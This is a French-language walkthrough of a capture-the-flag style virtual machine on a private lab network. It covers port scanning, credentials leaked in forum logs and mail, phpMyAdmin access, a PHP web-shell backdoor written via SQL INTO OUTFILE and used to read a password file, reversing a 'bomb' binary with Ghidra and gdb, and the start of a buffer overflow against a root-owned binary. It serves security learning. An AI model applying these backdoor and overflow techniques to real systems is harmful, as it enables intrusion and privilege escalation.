1. Creation d'un reseau prive hote pour la VM sur une adresse 192.168.56.107/24

2. Passage de l'outil nmap sur l'adresse 192.168.56.107
Obtention des ports utilises par le serveur :

Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-24 22:02 CEST
Nmap scan report for 192.168.56.107
Host is up (0.00015s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds

3. Navigation sur le serveur via modzilla. 
Routes possible : /forum

4. Dans le post "probleme login ?" de lmezard, on peut voir une longue list de log appartenant au serveur.
On peut apercevoir une ligne ou il y un refus de password pour l'identifiant "!q\]Ej?*5K5cy*AJ". Ce qui ressemble beaucoup a un mdp.
On essaye de se log au site avec l'identifiant "lmezard" et le mdp "!q\]Ej?*5K5cy*AJ".

5. Passage de dirb 192.168.56.107

On obtient tous les URL possible sur les fichiers serveurs

5. On ouvre un url webmail qui nous permet de nous identifier.
On essaye laurie@borntosec.net avec le mdp "!q\]Ej?*5K5cy*AJ" bingo on arrive a se log.

6. Dans la boite mail, un mail nous intrigue, mail provenant de qudevide@mail.borntosec.net
Il nous dit qu'on peut pas se connecter a la DB. Et nous dit d'utiliser root/Fg-'kKXBj87E:aJ$ (pour probablement se connecter la DB)

7. On accede a l'url de phpmydadmin, pour venir tenter d'utiliser la paire d'iendtifiant qu'on vient de decouvrir. Bingo ca marche, on est dans la db.

8. Dans la db, table forum_db, on a mlf2_userdata, ou on peut retrouver les mots de passes hachees.
On sait que le mdp hachee de lmezard correspond a "!q\]Ej?*5K5cy*AJ", donc on peut tenter de remplacer le mdp hachee de admin par celui de lmezard.
On se log in avec admin et "!q\]Ej?*5K5cy*AJ" sur le forum et bingo on est connecte.

9. Depuis phpmyadmin on a les droits pour creer un nouveau fichier php. On peut donc faire une injection de backdoor php.
Dans la console mysql de phpmyadmin on peut executer la commande SQL suivante: SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php";.

10. Maintenant notre backdoor est accessible en allant sur /forum/templates_c/backdoor.php

11.En allant sur 192.168.56.105/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password on obtiens cette paire user mot de passe:
lmezard:G!@M6f4Eatau{sF"

12. Depuis un terminal on peut faire ftp. Dedans faire open. Taper l'ip du serveur. Apres mettre lmezard et le mdp G!@M6f4Eatau{sF".
Une foi connecte on peut faire ls et voir un fichier README et fun.

13.On recupere ces fichiers sur la machine hote avec la commande getmet [fichier] 
On peut des a present quitter ftp

14. Ce fichier fun est un challenge qui nous permettera de recuperer une paire id/password pour se connecter en ssh sur le shell serveur

15. fun est un fichier binaire qu'on peut partiellement lire
C'est en fait un fichier compresse tar. Il faut le decompresse avec tar -xvf
On obtient un dossier ft_fun contenant plusieurs fichiers .pcap

16. Ces fichiers pcap contiennent des bouts de codes. On s'appercoit qu'il y a un main contenant des fonctions getme() qui permettent d'associe consecutivement des lettres pour formees un mot de passe
Certains fichiers pcap contiennent les tetes de fonctions et d'autres le contenu. Il faut qu'on retrouve les parties manquantes pour formees un seul et unique code qui compile et qui nous donne le mdp

// Manque la partie script pour recreer el bon code //

Le mot de passe obtenu est : Iheartpwnage
Le dernier printf nous consigne de crypter le mdp sous SHA-256 pour recuperer le mot de passe final
On utilise cyberchef sur internet avec SHA-2 256

Nous avons maintenant la paire laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4 pour se connecter via ssh

17. On se connecte via ssh : laurie:192.168.56.107 a partir de notre machine hote

Apres un ls, on peut apercevoir un README et un fichier bomb

Le fichier bomb est un executable binaire qui lance le challenge
Le README nous donne un indice :
HINT:
P
 2
 b

o
4

Cela correspond a certain charactere present dans les etapes de diffusion de la bomb

L'utilisation de Ghidra est requis pour recuperer le code C a partir du binaire bomb. Cela nous permet d'analyser le code pour trouver les solutions pour diffuser la bombe

Phase 1: Public speaking is very easy.
-> La fonction phase1 ne fait qu'une comparaison de string a string

Phase 2: 1 2 6 24 120 720
-> La fonction phase 2 verifie qu'il y a bien 6 entier rentrees. Le code nous dit que le premier element est 1 et l'indice nous dit que le deuxieme est 2. Grace a l'algo de verification on en deduit : tab[i + 1] != (i + 1) * tab[i].

Phase 3: 1 b 214
-> La fonction phase 3 verifie au'il y a 3 elements en entree (uint char int). Le switch case a partir du premier entier nous indiaue qu'il doit etre entre 0 et 7. Ensuite plusieurs combinaisaons sont possibles. Sachant que l'indice est deuxieme caractere = 'b', Il y a trois combinaisons possibles.

Phase 4: 9
-> La fonction phase 4 verifie qu'il y a seulement un parametre et qu'il est superieur ou egale a 1
Func 4 appelle dans phase4, verifie que le nombre est superieur a 2 sinon c'est pas bon
Cette func4 implemente la suite de fibonacci. Dans phase4, le retour de la fonction doit etre 55 sinon ca explose. On en deduit que le nombre doit etre 9 (car la suite demarre a F(1) donc F(10) = F(9)) en entree pour obtenir 55 selon la suite de fibonacci.

Phase 5: opekmq
-> La fonction phase 5 verifie que la string envoye est de longueur egale a 6 sinon ca explose. Une boucle rempli un tableau de char selon une logique.
Une fonction interne verifie si l'element est different de la string "giants" alors ca explose. Donc il faut que param_1 apres traitement soit egale a "giants".
Pour cela il nous faut comprendre l'algorithme. Dans une boucle de 5-6 tours, le programme attribut a chaque index d'un tableau d'int une valeur. Cette valeur est string[param1[i] & 0xf]. L'operation '& 0xf' effectue sur param1[i] permet de garder seulement les bits de poids faible. Le code ne nous permet pas d'avoir acces aux valeurs de strings qui nous permettera mieux de comprendre les valeurs attendus.

On rentre dans gdb sur le binaire bomb
On met un breakpoint sur la ligne assembleur qui recense la variable string pour pouvoir acceder a sa valeur durant l'execution puisqu'elle n'est pas presente dans le code. 

gdb bomb
break *0x8048d62
run
[nous sommes obliges de renseigner les etapes precedentes de diffusion de la bombe pour pouvoir arriver dans la fonction phase5 sans exploser]
x/s 0x804b220

On obtient 0x804b220:	"isrveawhobpnutfg\260\001"
Soit un contenu "isrveawhobpnutfg" de taille 16
Apres cela on peut deduire qu'il faut arriver a ecrire "giants" a partir de string[16] avec cette operation string[param1[i] & 0xf] ou param1[i] est la chaine de caracteres de longueur 6.

phase 6: 4 2 6 3 1 5
-> La fonction phase 6 verifie que 6 entiers sont rentrees en param sinon c'est pas bon.
L'indice pour celui ci est 4 pour le premier chiffre
La premiere boucle verifie que chacun des 6 chiffres n'est pas superieur a 6 (si 5 < chiffre - 1, ca pete). Et elle verifie qu'aucun des chiffres soit similaire.
Une autre boucle attribut des valeurs en fonction de notre chiffre rentre en parametre et les trie selon un ordre.
Une ligne dans la fonction nous interesse : local_38 = node1
Cette variable semble pointee vers une structure chainee
Si on rentre dans gdb, et qu'on affiche les nodes voila ce qu'on obtient :
(gdb) p (int)node1
$1 = 253
(gdb) p (int)node2
$2 = 725
(gdb) p (int)node3
$3 = 301
(gdb) p (int)node4
$4 = 997
(gdb) p (int)node5
$5 = 212
(gdb) p (int)node6
$6 = 432

Sachant que le premier chiffre est 4 on peut en deduire que 4 = node4 car c'est le plus grands.
Ensuite on a le node 2 > node 6 > node 3 > node 1 > node 5
Donc la reponse est 4 2 6 3 1 5

Apparement il y a un soucis dans le sujet donc la vrai reponse est 4 2 6 1 3 5


Apres toutes ces etapes on peut creer le mot de passe final pour 'thor' :
Publicspeakingisveryeasy.126241207201b2149opekmq426135

18. Connection en ssh a thor : ssh thor@192.168.56.107

Nous avons acces a un fichier turtle contenant des indications a suivre.
Il semble que turtle fasse reference a la library turtle python permettant de dessiner 
Si on execute le script python avec turtle : on obtient le mot "SLASH"
Voir le script tortue.py.
A la fin du fichier il y a ecrit "Can you digest the message?". On peut se demander si cette phrase a une utilite et effectivement c'est le cas. "digest" fait reference au protocole MD5 de cryptage de password. On a plus qu'a crypter "SLASH" en MD5 sur cyberchef.
On obtient le password : 646da671ca01bb5d84dbb5fb2238dc8e

19. Connection en ssh a zaz : ssh zaz@192.168.56.107

Lien explication bufferoverflow : 
https://defendtheweb.net/article/buffer-overflow-to-run-root-shell-full-tutorial
https://www.coengoedegebure.com/buffer-overflow-attacks-explained/

On a acces sur ce profil a un fichier exploit_me ainsi qu'un dossier mail
Les fichiers dans le dossier Mail sont vides.
On passe exploit_me dans ghidra pour recuperer le code en C. Dans la fonction main, si un argument est donne alors il est copie dans un tableau de char d'une taille de 140.
Et il est ensuite affiche a l'aide de la fonction puts()

Le tampon limitee de 140 va nous permettre de faire un buffer overflow pour ouvrir un terminal en root vu que exploit_me appartient a root

Desactiver l'ASLR : cat /proc/sys/kernel/randomize_va_space
Si le retour est 0 c'est qu'il est desactivee

Syntaxe python pour generer une string de x caracteres : 
- `python -c 'print "A"*400'`

Utilisation de gdb pour voir l'adresse de segfault :
- gdb -q --args ./exploit_me `python -c 'print('A' * 140)'`
- run

Segfault recu a l'adresse :
- 0xb7e45400 (__libc_start_main) avec 140
OU
- 0x30303030 in ?? () avec 145


